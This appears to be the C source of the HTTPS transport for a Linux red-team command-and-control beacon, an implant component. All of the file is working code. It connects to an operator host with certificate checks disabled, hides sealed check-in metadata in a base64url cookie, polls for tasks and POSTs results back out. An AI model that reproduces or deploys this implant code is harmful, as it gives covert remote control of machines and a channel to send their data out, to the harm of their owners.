// HTTPS transport for the Linux beacon using raw OpenSSL sockets.
// No libcurl dependency — smaller binary, easier static linking.
//
// Protocol matches the Windows beacon:
//   checkin:       GET uri_checkin, Cookie: <name>=<base64url(sealed_metadata)>
//   poll_tasks:    GET uri_task,    Cookie: <name>=<beacon_id>
//   submit_output: POST uri_post,   Cookie: <name>=<beacon_id>, body = sealed frame

#include "../../core/beacon.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

// External accessors for cached UTF-8 fields (defined in main.c)
extern const char* beacon_host(void);
extern const char* beacon_uri_checkin(void);
extern const char* beacon_uri_task(void);
extern const char* beacon_uri_post(void);
extern const char* beacon_user_agent(void);
extern const char* beacon_cookie_name(void);

// ---- Base64url encoder/decoder (no padding, URL-safe) ----------------------

static const char b64url_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

static size_t b64url_encode(const uint8_t* src, size_t src_len,
                            char* dst, size_t dst_cap) {
    size_t out = 0;
    for (size_t i = 0; i < src_len; i += 3) {
        uint32_t b = (uint32_t)src[i] << 16;
        if (i+1 < src_len) b |= (uint32_t)src[i+1] << 8;
        if (i+2 < src_len) b |= (uint32_t)src[i+2];
        size_t rem = src_len - i;
        if (out+1 < dst_cap) dst[out++] = b64url_table[(b>>18)&63];
        if (out+1 < dst_cap) dst[out++] = b64url_table[(b>>12)&63];
        if (rem > 1 && out+1 < dst_cap) dst[out++] = b64url_table[(b>>6)&63];
        if (rem > 2 && out+1 < dst_cap) dst[out++] = b64url_table[b&63];
    }
    if (out < dst_cap) dst[out] = '\0';
    return out;
}

static int8_t b64url_val(uint8_t c) {
    if (c >= 'A' && c <= 'Z') return (int8_t)(c - 'A');
    if (c >= 'a' && c <= 'z') return (int8_t)(c - 'a' + 26);
    if (c >= '0' && c <= '9') return (int8_t)(c - '0' + 52);
    if (c == '-') return 62;
    if (c == '_') return 63;
    return -1;
}

static int b64url_decode(const char* src, size_t src_len,
                         uint8_t* dst, size_t dst_cap, size_t* out_len) {
    *out_len = 0;
    size_t i = 0;
    while (i < src_len) {
        uint32_t b = 0; int have = 0;
        while (have < 4 && i < src_len) {
            int8_t v = b64url_val((uint8_t)src[i++]);
            if (v < 0) continue;
            b = (b << 6) | (uint8_t)v;
            have++;
        }
        if (have < 2) break;
        if (*out_len < dst_cap) dst[(*out_len)++] = (uint8_t)(b >> (have==4?16:have==3?10:4));
        if (have >= 3 && *out_len < dst_cap) dst[(*out_len)++] = (uint8_t)((b >> (have==4?8:2)) & 0xFF);
        if (have == 4 && *out_len < dst_cap) dst[(*out_len)++] = (uint8_t)(b & 0xFF);
    }
    return 1;
}

// ---- TLS connection helper -------------------------------------------------

static SSL_CTX* g_ssl_ctx = NULL;

static int ensure_ssl_ctx(void) {
    if (g_ssl_ctx) return 1;
    g_ssl_ctx = SSL_CTX_new(TLS_client_method());
    if (!g_ssl_ctx) return 0;
    // Disable certificate verification (red team — self-signed certs)
    SSL_CTX_set_verify(g_ssl_ctx, SSL_VERIFY_NONE, NULL);
    return 1;
}

// Connect via TCP + TLS, returns SSL* or NULL.
static SSL* tls_connect(void) {
    if (!ensure_ssl_ctx()) return NULL;

    const char* host = beacon_host();
    uint16_t port = beacon_state()->port;

    // Resolve host
    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", (unsigned)port);

    struct addrinfo hints = {0};
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo* res = NULL;
    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res)
        return NULL;

    int fd = socket(res->ai_family, SOCK_STREAM, 0);
    if (fd < 0) { freeaddrinfo(res); return NULL; }
    sock_nosigpipe(fd);

    if (connect(fd, res->ai_addr, res->ai_addrlen) != 0) {
        close(fd);
        freeaddrinfo(res);
        return NULL;
    }
    freeaddrinfo(res);

    SSL* ssl = SSL_new(g_ssl_ctx);
    if (!ssl) { close(fd); return NULL; }

    SSL_set_fd(ssl, fd);
    SSL_set_tlsext_host_name(ssl, host);  // SNI

    if (SSL_connect(ssl) <= 0) {
        SSL_free(ssl);
        close(fd);
        return NULL;
    }

    return ssl;
}

static void tls_close(SSL* ssl) {
    if (!ssl) return;
    int fd = SSL_get_fd(ssl);
    SSL_shutdown(ssl);
    SSL_free(ssl);
    if (fd >= 0) close(fd);
}

// ---- HTTP request/response over TLS ----------------------------------------

// Send raw data over SSL
static int ssl_write_all(SSL* ssl, const void* buf, size_t len) {
    const uint8_t* p = (const uint8_t*)buf;
    size_t sent = 0;
    while (sent < len) {
        int n = SSL_write(ssl, p + sent, (int)(len - sent));
        if (n <= 0) return -1;
        sent += (size_t)n;
    }
    return 0;
}

// Read HTTP response. Extracts status code + body.
// Returns HTTP status code, fills body/body_len. Returns -1 on error.
static int http_read_response(SSL* ssl, uint8_t* body, size_t body_cap, size_t* body_len) {
    *body_len = 0;

    // Read response into buffer (up to 2MB)
    size_t buf_cap = 2 * 1024 * 1024;
    uint8_t* buf = (uint8_t*)bmalloc(buf_cap);
    if (!buf) return -1;

    size_t total = 0;
    while (total < buf_cap) {
        int n = SSL_read(ssl, buf + total, (int)(buf_cap - total));
        if (n <= 0) break;
        total += (size_t)n;
        // Check if we have full headers + content-length body
        // Simple heuristic: look for \r\n\r\n then check Content-Length
        char* hdr_end = NULL;
        for (size_t i = 0; i + 3 < total; ++i) {
            if (buf[i] == '\r' && buf[i+1] == '\n' && buf[i+2] == '\r' && buf[i+3] == '\n') {
                hdr_end = (char*)(buf + i + 4);
                break;
            }
        }
        if (hdr_end) {
            size_t hdr_len = (size_t)(hdr_end - (char*)buf);
            // Find Content-Length
            size_t content_len = 0;
            char* cl = strstr((char*)buf, "Content-Length:");
            if (!cl) cl = strstr((char*)buf, "content-length:");
            if (cl) {
                cl += 15; // skip "Content-Length:"
                while (*cl == ' ') cl++;
                content_len = (size_t)atol(cl);
            }
            if (content_len == 0) {
                // No content-length — try chunked or just read what we have
                // For simplicity, if no Content-Length, assume body is what follows headers
                break;
            }
            if (total >= hdr_len + content_len) break;
        }
    }

    if (total == 0) { bfree(buf); return -1; }

    // Parse status line: "HTTP/1.x NNN ..."
    int status = 0;
    if (total > 12 && buf[0] == 'H' && buf[1] == 'T' && buf[2] == 'T' && buf[3] == 'P') {
        // Find first space after "HTTP/1.x"
        size_t sp = 0;
        for (sp = 4; sp < total && buf[sp] != ' '; ++sp);
        if (sp + 3 < total) {
            status = (buf[sp+1]-'0')*100 + (buf[sp+2]-'0')*10 + (buf[sp+3]-'0');
        }
    }

    // Extract body (after \r\n\r\n)
    uint8_t* body_start = NULL;
    for (size_t i = 0; i + 3 < total; ++i) {
        if (buf[i] == '\r' && buf[i+1] == '\n' && buf[i+2] == '\r' && buf[i+3] == '\n') {
            body_start = buf + i + 4;
            break;
        }
    }
    if (body_start) {
        size_t blen = total - (size_t)(body_start - buf);
        if (blen > body_cap) blen = body_cap;
        memcpy(body, body_start, blen);
        *body_len = blen;
    }

    bfree(buf);
    return status;
}

// Build and send HTTP request, get response body.
static int http_request(const char* method, const char* uri,
                        const char* cookie_hdr,
                        const uint8_t* body_data, size_t body_data_len,
                        uint8_t* resp_body, size_t* resp_body_len) {
    SSL* ssl = tls_connect();
    if (!ssl) return -1;

    const char* host = beacon_host();
    const char* ua = beacon_user_agent();

    // Build request
    char req_buf[4096];
    int hdr_len;
    if (body_data && body_data_len > 0) {
        hdr_len = snprintf(req_buf, sizeof(req_buf),
            "%s %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Cookie: %s\r\n"
            "Content-Length: %zu\r\n"
            "Content-Type: application/octet-stream\r\n"
            "\r\n",
            method, uri, host, ua, cookie_hdr, body_data_len);
    } else {
        hdr_len = snprintf(req_buf, sizeof(req_buf),
            "%s %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Cookie: %s\r\n"
            "Connection: close\r\n"
            "\r\n",
            method, uri, host, ua, cookie_hdr);
    }

    if (hdr_len <= 0 || (size_t)hdr_len >= sizeof(req_buf)) {
        tls_close(ssl);
        return -1;
    }

    // Send headers
    if (ssl_write_all(ssl, req_buf, (size_t)hdr_len) != 0) {
        tls_close(ssl);
        return -1;
    }
    // Send body if present
    if (body_data && body_data_len > 0) {
        if (ssl_write_all(ssl, body_data, body_data_len) != 0) {
            tls_close(ssl);
            return -1;
        }
    }

    // Read response
    int status = http_read_response(ssl, resp_body, *resp_body_len, resp_body_len);
    tls_close(ssl);
    return (status == 200) ? 0 : -1;
}

// ---- Transport vtable implementation ---------------------------------------

static int https_checkin(const uint8_t* metadata, size_t metadata_len,
                         uint8_t* out_frame, size_t* out_frame_len) {
    // Base64url-encode the sealed metadata frame
    size_t b64_cap = metadata_len * 2 + 4;
    char* b64 = (char*)bmalloc(b64_cap);
    if (!b64) return -1;
    size_t b64_len = b64url_encode(metadata, metadata_len, b64, b64_cap);

    // Build cookie header: <cookie_name>=<b64 data>
    const char* cookie_name = beacon_cookie_name();
    size_t cookie_cap = strlen(cookie_name) + 1 + b64_len + 1;
    char* cookie = (char*)bmalloc(cookie_cap);
    if (!cookie) { bfree(b64); return -1; }
    snprintf(cookie, cookie_cap, "%s=%s", cookie_name, b64);
    bfree(b64);

    // GET uri_checkin
    int rc = http_request("GET", beacon_uri_checkin(), cookie,
                          NULL, 0, out_frame, out_frame_len);
    bfree(cookie);
    if (rc != 0) return -1;

    // Response body is base64url-encoded sealed frame
    if (*out_frame_len > 0) {
        uint8_t* decoded = (uint8_t*)bmalloc(*out_frame_len);
        if (!decoded) return -1;
        size_t dec_len = 0;
        b64url_decode((const char*)out_frame, *out_frame_len,
                      decoded, *out_frame_len, &dec_len);
        memcpy(out_frame, decoded, dec_len);
        *out_frame_len = dec_len;
        bfree(decoded);
    }

    return 0;
}

static int https_poll_tasks(uint8_t* out_frame, size_t* out_frame_len) {
    BeaconState* st = beacon_state();
    if (!st->beacon_id[0]) return -1;

    // Cookie: <name>=<beacon_id>
    const char* cookie_name = beacon_cookie_name();
    char cookie[256];
    snprintf(cookie, sizeof(cookie), "%s=%s", cookie_name, st->beacon_id);

    size_t resp_cap = *out_frame_len;
    int rc = http_request("GET", beacon_uri_task(), cookie,
                          NULL, 0, out_frame, out_frame_len);
    if (rc != 0 || *out_frame_len == 0) {
        *out_frame_len = 0;
        return (rc == 0) ? 0 : -1;  // Empty response = no tasks
    }

    // Decode base64url response body
    uint8_t* decoded = (uint8_t*)bmalloc(resp_cap);
    if (!decoded) { *out_frame_len = 0; return -1; }
    size_t dec_len = 0;
    b64url_decode((const char*)out_frame, *out_frame_len,
                  decoded, resp_cap, &dec_len);
    memcpy(out_frame, decoded, dec_len);
    *out_frame_len = dec_len;
    bfree(decoded);

    return 0;
}

static int https_submit_output(const uint8_t* frame, size_t frame_len) {
    BeaconState* st = beacon_state();
    if (!st->beacon_id[0]) return -1;

    const char* cookie_name = beacon_cookie_name();
    char cookie[256];
    snprintf(cookie, sizeof(cookie), "%s=%s", cookie_name, st->beacon_id);

    uint8_t resp[256];
    size_t rlen = sizeof(resp);
    return http_request("POST", beacon_uri_post(), cookie,
                        frame, frame_len, resp, &rlen);
}

static int https_connection_lost(void) {
    // HTTPS is stateless — no persistent connection to lose
    return 0;
}

const TransportVtbl g_transport_https = {
    .checkin         = https_checkin,
    .poll_tasks      = https_poll_tasks,
    .submit_output   = https_submit_output,
    .connection_lost = https_connection_lost,
};
